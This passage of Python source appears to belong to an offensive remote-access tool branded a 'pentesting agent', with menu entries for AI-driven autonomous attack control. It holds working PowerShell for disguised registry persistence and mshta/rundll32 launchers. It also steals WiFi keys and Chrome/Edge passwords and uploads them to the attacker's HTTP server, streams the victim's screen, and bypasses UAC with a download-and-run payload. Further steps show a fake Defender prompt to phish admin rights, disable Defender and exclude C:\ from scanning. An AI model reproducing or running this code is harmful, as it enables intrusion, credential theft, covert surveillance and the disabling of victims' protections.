            cmd = f'''try {{ $p = "{secure_path}"; New-Item -ItemType Directory -Force -Path $p -ErrorAction SilentlyContinue | Out-Null; $s='{tls_payload}'; $s | Out-File "$p\\{payload_name}" -Force; reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v OneDriveUpdate /d "powershell -w hidden -ep bypass -file `"$p\\{payload_name}`"" /f; echo "TLS Secure Persistence Installed in: $p" }} catch {{ echo "Error: $_" }}'''
            console.print(f"[cyan]Installing TLS persistence to Safe Zone: {secure_path}...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            input("\n[Enter to continue]")
        
        elif choice == "6":
            # LOLBin: mshta.exe launcher
            console.print("[cyan]Creating mshta.exe launcher for existing payload...[/]")
            # This assumes payload already exists at %APPDATA%\winlogon.ps1
            cmd = '''mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -w hidden -f %APPDATA%\\winlogon.ps1"", 0:close")'''
            console.print(f"[dim]Executing: mshta vbscript:...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]Launched via mshta.exe[/]")
            console.print(f"[yellow]Note: A new shell should connect if payload exists[/]")
            input("\n[Enter to continue]")
        
        elif choice == "7":
            # LOLBin: rundll32 launcher
            console.print("[cyan]Creating rundll32 launcher for existing payload...[/]")
            # Uses JavaScript to spawn PowerShell
            cmd = r'''rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -w hidden -ep bypass -f %APPDATA%\winlogon.ps1")'''
            console.print(f"[dim]Executing: rundll32.exe javascript:...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]Launched via rundll32.exe[/]")
            console.print(f"[yellow]Note: A new shell should connect if payload exists[/]")
            input("\n[Enter to continue]")

def menu_steal_data():
    """Data theft submenu."""
    while True:
        os.system('clear')
        choice = show_menu("STEAL DATA", [
            ("1", "WiFi Passwords"),
            ("2", "Windows Vault Credentials"),
            ("3", "Browser Passwords (Chrome/Edge)"),
            ("4", "System Info"),
            ("5", "Live Monitor (Video Feed)"),
            ("0", "← Back"),
        ])
        
        if choice == "0":
            break
        elif choice == "1":
            # Extract WiFi and save to ATTACKER machine
            cmd = '''$r=@();(netsh wlan show profiles)|Select-String "All User Profile"|ForEach-Object{$p=($_ -split ":")[-1].Trim();$k=(netsh wlan show profile name="$p" key=clear)|Select-String "Key Content";if($k){$r+="$p : "+($k -split ":")[-1].Trim()}};echo "=== WiFi Passwords ===";$r'''
            console.print("[cyan]Extracting WiFi passwords...[/]")
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]WiFi Passwords[/]"))
            # Save to ATTACKER machine
            loot_dir = os.path.join(os.path.dirname(__file__), "loot")
            os.makedirs(loot_dir, exist_ok=True)
            loot_file = os.path.join(loot_dir, f"wifi_{SHELL.addr[0] if SHELL.addr else 'unknown'}.txt")
            with open(loot_file, 'w') as f:
                f.write(result)
            console.print(f"[bold green]Saved to YOUR machine: {loot_file}[/]")
            input("\n[Enter to continue]")
        elif choice == "2":
            cmd = 'cmdkey /list'
            console.print("[cyan]Extracting Windows Vault...[/]")
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]Windows Vault[/]"))
            # Save to ATTACKER machine
            loot_dir = os.path.join(os.path.dirname(__file__), "loot")
            os.makedirs(loot_dir, exist_ok=True)
            loot_file = os.path.join(loot_dir, f"vault_{SHELL.addr[0] if SHELL.addr else 'unknown'}.txt")
            with open(loot_file, 'w') as f:
                f.write(result)
            console.print(f"[bold green]Saved to YOUR machine: {loot_file}[/]")
            input("\n[Enter to continue]")
        elif choice == "3":
            # ============================================================
            # BROWSER PASSWORD EXTRACTION - With browser selection
            # ============================================================
            browser_choice = show_menu("🌐 SELECT BROWSER", [
                ("1", "Chrome"),
                ("2", "Edge"),
                ("3", "Both"),
                ("0", "← Back"),
            ])
            
            if browser_choice == "0":
                continue
            
            console.print("[cyan]Exfiltrating browser data via HTTP...[/]")
            
            target_ip = SHELL.addr[0] if SHELL.addr else 'unknown'
            
            # Build browser array based on selection
            if browser_choice == "1":
                browsers_ps = '@(@{Name="Chrome"; Path="$env:LOCALAPPDATA\\Google\\Chrome\\User Data"})'
                console.print("[yellow]Target: Chrome[/]")
            elif browser_choice == "2":
                browsers_ps = '@(@{Name="Edge"; Path="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"})'
                console.print("[yellow]Target: Edge[/]")
            else:
                browsers_ps = '''@(
    @{Name="Edge"; Path="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"},
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\\Google\\Chrome\\User Data"}
)'''
                console.print("[yellow]Target: Both browsers[/]")
            
            cmd = f'''
$ip = "{CFG.get_ip()}"
$port = {CFG.http_port}
$id = "{target_ip}"

$browsers = {browsers_ps}

Add-Type -AssemblyName System.Security

foreach ($b in $browsers) {{
    # 1. GET MASTER KEY
    $localState = Join-Path $b.Path "Local State"
    if (Test-Path $localState) {{
        try {{
            $json = Get-Content $localState -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $encKey = $encKey[5..($encKey.Length - 1)] 
            $masterKey = [Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
            $b64Key = [Convert]::ToBase64String($masterKey)
            
            # Upload Key
            $url = "http://$ip:$port/ups?t=key&b=$($b.Name)&id=$id"
            try {{ Invoke-RestMethod -Uri $url -Method Post -Body $b64Key -ErrorAction SilentlyContinue }} catch {{}}
        }} catch {{}}
    }}

    # 2. GET LOGIN DATA
    $paths = @("Default\\Login Data", "Default\\Login Data New")
    foreach ($p in $paths) {{
        $db = Join-Path $b.Path $p
        if (Test-Path $db) {{
            $temp = "$env:TEMP\\$($b.Name).db"
            try {{
                Copy-Item $db $temp -Force -ErrorAction Stop
                $bytes = [IO.File]::ReadAllBytes($temp)
                $b64 = [Convert]::ToBase64String($bytes)
                
                # Upload DB
                $url = "http://$ip:$port/ups?t=db&b=$($b.Name)&id=$id"
                try {{ Invoke-RestMethod -Uri $url -Method Post -Body $b64 -ErrorAction SilentlyContinue }} catch {{}}
                
                Remove-Item $temp -Force
            }} catch {{}}
        }}
    }}
}}
'''
            SHELL.execute(cmd)
            console.print("[yellow]Waiting for uploads...[/]")
            time.sleep(3) # Give it a moment to upload
            
            # --- LOCAL PROCESSING ---
            loot_dir = os.path.join(os.path.dirname(__file__), "loot")
            
            # Check for uploaded files
            # Format: key_{id}_{browser}.txt, db_{id}_{browser}.txt
            import glob
            
            found_data = False
            
            # Decrypt locally
            import sqlite3
            import base64
            
            if not CRYPTO_AVAILABLE:
                console.print("[red]WARNING: 'cryptography' library not installed![/]")
                console.print("[yellow]Browser password decryption requires: pip install cryptography[/]")
                console.print("[dim]Files were exfiltrated but cannot be decrypted locally.[/]")
                input("\n[Enter to continue]")
                return
            
            # Find all key files for this target
            key_files = glob.glob(os.path.join(loot_dir, f"key_{target_ip}_*.txt"))
            
            final_results = ""
            
            for kf in key_files:
                try:
                    # Extract browser name from filename: key_IP_Browser.txt
                    fname = os.path.basename(kf)
                    browser_name = fname.replace(f"key_{target_ip}_", "").replace(".txt", "")
                    
                    # Find corresponding DB file
                    db_file = os.path.join(loot_dir, f"db_{target_ip}_{browser_name}.txt")
                    if not os.path.exists(db_file): continue
                    
                    found_data = True
                    
                    # Load Key
                    with open(kf, 'r') as f: b64_key = f.read().strip()
                    key = base64.b64decode(b64_key)
                    
                    # Load DB
                    with open(db_file, 'r') as f: b64_db = f.read().strip()
                    
                    # Save temp DB for sqlite3
                    temp_db_path = os.path.join(loot_dir, f"temp_{target_ip}_{browser_name}.db")
                    with open(temp_db_path, "wb") as f:
                        f.write(base64.b64decode(b64_db))
                        
                    if CRYPTO_AVAILABLE:
                        conn = sqlite3.connect(temp_db_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        count = 0
                        for r in cursor.fetchall():
                            url = r[0]
                            user = r[1]
                            enc_pass = r[2]
                            if not enc_pass or len(enc_pass) < 15: continue
                            
                            try:
                                if enc_pass[:3] in [b'v10', b'v11']:
                                    nonce = enc_pass[3:15]
                                    ciphertext = enc_pass[15:-16]
                                    tag = enc_pass[-16:]
                                    aes = AESGCM(key)
                                    plaintext = aes.decrypt(nonce, ciphertext + tag, None)
                                    final_results += f"{browser_name} | {url} | {user} | {plaintext.decode()}\n"
                                    count += 1
                            except: pass
                        conn.close()
                        if count > 0:
                            console.print(f"[green]Decrypted {count} passwords from {browser_name}[/]")
                        os.remove(temp_db_path)
                    
                except Exception as e:
                    console.print(f"[red]Error processing {browser_name}: {e}[/]")

            if final_results:
                loot_file = os.path.join(loot_dir, f"decrypted_{target_ip}.txt")
                with open(loot_file, 'w') as f:
                    f.write(final_results)
                console.print(Panel(final_results, title="[green]Decrypted Passwords[/]"))
                console.print(f"[bold green]Saved to: {loot_file}[/]")
            elif not found_data:
                console.print("[red]No data received via upload. Blocked by firewall?[/]")
                
            input("\n[Enter to continue]")
        elif choice == "4":
            cmd = 'systeminfo | findstr /B /C:"OS" /C:"Host" /C:"System"; echo "---"; whoami /all'
            console.print("[cyan]Getting system info...[/]")
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]System Info[/]"))
            input("\n[Enter to continue]")

        elif choice == "5":
            # LIVE MONITOR
            ip = CFG.get_ip()
            port = CFG.http_port
            
            # PowerShell Camera Script (Loop)
            # Uses System.Drawing to capture, resize, and upload frame
            ps_cam = f'''
$ip = "{ip}"; $port = {port};
Add-Type -AssemblyName System.Windows.Forms;
Add-Type -AssemblyName System.Drawing;

while($true) {{
    try {{
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;
        $g = [System.Drawing.Graphics]::FromImage($bmp);
        $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size);
        
        # Resize to 800px width (Speed optimization)
        $w = 800;
        $h = [int]($screen.Height * ($w / $screen.Width));
        $bmp2 = New-Object System.Drawing.Bitmap $w, $h;
        $g2 = [System.Drawing.Graphics]::FromImage($bmp2);
        $g2.DrawImage($bmp, 0, 0, $w, $h);
        
        # Save as JPG (Quality 50)
        $ms = New-Object IO.MemoryStream;
        $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {{ $_.MimeType -eq "image/jpeg" }};
        $params = New-Object System.Drawing.Imaging.EncoderParameters(1);
        $params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 50);
        $bmp2.Save($ms, $codec, $params);
        $bytes = $ms.ToArray();
        
        # Upload
        $url = "http://$ip:$port/ups?t=live";
        Invoke-RestMethod -Uri $url -Method Post -Body $bytes -TimeoutSec 1 -ErrorAction SilentlyContinue;
        
        $g.Dispose(); $g2.Dispose(); $bmp.Dispose(); $bmp2.Dispose(); $ms.Dispose();
    }} catch {{}}
    Start-Sleep -Milliseconds 500;
}}
'''
            # Flatten & Run as Job
            flat_ps = ps_cam.replace('\\n', ' ').replace('\\r', '')
            job_cmd = f'Start-Job -ScriptBlock {{ {flat_ps} }}'
            
            console.print("[cyan]Starting Live Camera Feed on victim... (Background Job)[/]")
            SHELL.execute(job_cmd)
            
            console.print(Panel(f"[bold green]🔴 LIVE FEED STARTED![/]\n\nOpen this URL in your browser:\n[white]http://{ip}:{port}/watch[/white]", title="Surveillance"))
            console.print("[dim](Press Enter to return to menu. The feed keeps running)[/]")
            input()

def menu_privesc():
    """Privilege escalation submenu."""
    while True:
        os.system('clear')
        choice = show_menu("PRIVILEGE ESCALATION", [
            ("1", "Check Current Privileges"),
            ("2", "UAC Bypass (eventvwr - stealthier)"),
            ("3", "UAC Bypass (computerdefaults)"),
            ("4", "Fake Defender Prompt + Request Admin"),
            ("5", "Disable Defender (needs admin)"),
            ("6", "Add Exclusion Path (needs admin)"),
            ("7", "Check Defender Status"),
            ("0", "← Back"),
        ])
        
        if choice == "0":
            break
        elif choice == "1":
            cmd = 'whoami /priv; whoami /groups | findstr /i "admin"'
            console.print("[cyan]Checking privileges...[/]")
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]Privileges[/]"))
            input("\n[Enter to continue]")
        elif choice == "2":
            # eventvwr.exe UAC bypass - stealthier than fodhelper
            # Use Base64 encoded command to avoid issues
            ip = CFG.get_ip()
            ps_cmd = f"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"
            import base64
            encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
            
            cmd = f'''$c="powershell -w hidden -enc {encoded_cmd}";New-Item -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Force | Out-Null;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Name "(default)" -Value $c -Force;Start-Process eventvwr.exe;Start-Sleep 2;Remove-Item -Path "HKCU:\\Software\\Classes\\mscfile" -Recurse -Force'''
            console.print("[cyan]Attempting eventvwr UAC bypass...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            SHELL.wait_for_new_shell(timeout=15)
            input("\n[Enter to continue]")
        elif choice == "3":
            # computerdefaults.exe bypass - Use Base64 encoded command
            ip = CFG.get_ip()
            ps_cmd = f"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"
            import base64
            encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
            
            cmd = f'''$c="powershell -w hidden -enc {encoded_cmd}";New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force | Out-Null;New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force | Out-Null;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value $c -Force;Start-Process computerdefaults.exe;Start-Sleep 2;Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force'''
            console.print("[cyan]Attempting computerdefaults UAC bypass...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            SHELL.wait_for_new_shell(timeout=15)
            input("\n[Enter to continue]")
        elif choice == "4":
            # Create VBS that shows fake Defender dialog, then requests admin
            # Use Base64 encoded command to avoid quote escaping issues
            ip = CFG.get_ip()
            port = CFG.listener_port
            
            # Build a simple PowerShell command that downloads and runs /s
            ps_cmd = f"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"
            
            # Base64 encode it for clean passing through VBS
            import base64
            encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
            
            vbs_cmd = f'''$v=@"
Set objShell = CreateObject("WScript.Shell")
MsgBox "Windows Defender requires elevated permissions to complete a security scan." & vbCrLf & vbCrLf & "Click OK to authorize.", vbExclamation, "Windows Defender - Security Alert"
objShell.Run "powershell -w hidden -ep bypass -c Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -ep bypass -enc {encoded_cmd}'", 0, False
"@;$v|Out-File "$env:TEMP\\defender.vbs" -Encoding ASCII;Start-Process wscript -ArgumentList "$env:TEMP\\defender.vbs"'''
            console.print("[cyan]Showing fake Defender dialog + UAC prompt...[/]")
            result = SHELL.execute(vbs_cmd)
            console.print(f"[green]{result}[/]")
            console.print("[yellow]User will see Defender dialog, then UAC prompt. If accepted, elevated shell connects![/]")
            # Wait for new elevated shell
            SHELL.wait_for_new_shell(timeout=30)
            input("\n[Enter to continue]")
        elif choice == "5":
            # Disable Defender (requires admin)
            console.print("[cyan]Attempting to disable Windows Defender...[/]")
            console.print("[yellow]This REQUIRES admin privileges![/]")
            cmd = 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true; echo "Defender disabled (if admin)!"'
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]Disable Defender Result[/]"))
            input("\n[Enter to continue]")
        elif choice == "6":
            # Add exclusion path
            console.print("[cyan]Adding exclusion paths to Defender...[/]")
            console.print("[yellow]This REQUIRES admin privileges![/]")
            cmd = 'Add-MpPreference -ExclusionPath "C:\\"; Add-MpPreference -ExclusionPath "$env:TEMP"; Add-MpPreference -ExclusionProcess "powershell.exe"; echo "Exclusions added (if admin)!"'
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]Add Exclusion Result[/]"))
            input("\n[Enter to continue]")
        elif choice == "7":
            # Check Defender status
            console.print("[cyan]Checking Windows Defender status...[/]")
            cmd = 'Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, IoavProtectionEnabled, BehaviorMonitorEnabled, AntivirusEnabled | Format-List'
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]Defender Status[/]"))
            input("\n[Enter to continue]")

def raw_shell():
    """Interactive raw shell mode."""
    console.print("[bold cyan]RAW SHELL MODE[/]")
    console.print("[dim]Type 'exit' to return to menu[/]\n")
    
    while True:
        try:
            cmd = input("PS> ")
            if cmd.lower() == 'exit':
                break
            result = SHELL.execute(cmd)
            print(result)
        except KeyboardInterrupt:
            break

def post_exploitation_menu():
    """Main post-exploitation menu after shell connects."""
    while True:
        os.system('clear')
        
        # Check if shell is still connected
        status = "[bold green]Connected[/]" if SHELL.connected else "[bold red]✗ Disconnected[/]"
        console.print(Panel(f"{status}\n[dim]Target: {SHELL.addr[0] if SHELL.addr else 'N/A'}[/]", 
                           title="ACTIVE SESSION", border_style="green" if SHELL.connected else "red"))
        
        choice = show_menu("What do you want to do?", [
            ("1", "Install Persistence"),
            ("2", "Steal Data"),
            ("3", " Privilege Escalation"),
            ("4", "Raw Shell (manual commands)"),
            ("5", "Wait for Reconnect"),
            ("6", "AI Autonomous Mode"),
            ("7", "AI Assistant (tell it what to do)"),
            ("0", "Exit"),
        ])
        
        if choice == "0":
            if Prompt.ask("[bold]Really exit?[/]", choices=["y", "n"], default="n") == "y":
                break
        elif choice == "1":
            menu_persistence()
        elif choice == "2":
            menu_steal_data()
        elif choice == "3":
            menu_privesc()
        elif choice == "4":
            raw_shell()
        elif choice == "5":
            console.print("[cyan]Waiting for shell to reconnect (persistence will auto-connect)...[/]")
            SHELL.wait_for_new_shell(timeout=60)
        elif choice == "6":
            autonomous_mode()
        elif choice == "7":
            ai_assistant_mode()

# ============================================================================
# MAIN - Phase 1: Get Shell, Phase 2: Menu
# ============================================================================

def main():
    os.system('clear')
    
    banner = """
    ╔═══════════════════════════════════════════════════════════════╗
    ║        HYBRID PENTESTING AGENT                          ║
    ║   ───────────────────────────────────────────────────         ║
    ║   Phase 1: Auto-serve link → Shell connects                   ║
    ║   Phase 2: Menu appears → You control everything              ║
    ╚═══════════════════════════════════════════════════════════════╝
    """
    console.print(banner, style="bold cyan")
    
    ip = CFG.get_ip()
    console.print(f"[bold]Your IP:[/] {ip}")
    console.print(f"[bold]Listener:[/] {CFG.listener_port}")
    console.print(f"[bold]HTTP:[/] {CFG.http_port}\n")
    
    # Phase 1: Start servers
    console.print("[cyan]Starting HTTP server...[/]")
    start_http_server()
    console.print(f"[green]HTTP server on port {CFG.http_port}[/]")
    
    console.print("[cyan]Starting listener...[/]")
    SHELL.start_listener(CFG.listener_port)
    
    console.print(Panel(f"""
[bold yellow]Send this link to victim:[/]

[bold white]http://{ip}:{CFG.http_port}/[/]

Waiting for shell connection...
""", title="PHASE 1: GET SHELL", border_style="yellow"))
    
    # Wait for shell
    if SHELL.wait_for_connection(timeout=600):
        console.print("\n[bold green]🎉 SHELL OBTAINED![/]")
        console.print("[cyan]Entering post-exploitation menu...[/]\n")
        input("[Press Enter to continue]")
        
        # Phase 2: Post-exploitation menu
        post_exploitation_menu()
    else:
        console.print("[red]Timeout waiting for connection.[/]")
    
    SHELL.close()
    console.print("[yellow]Goodbye![/]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted.[/]")
        SHELL.close()
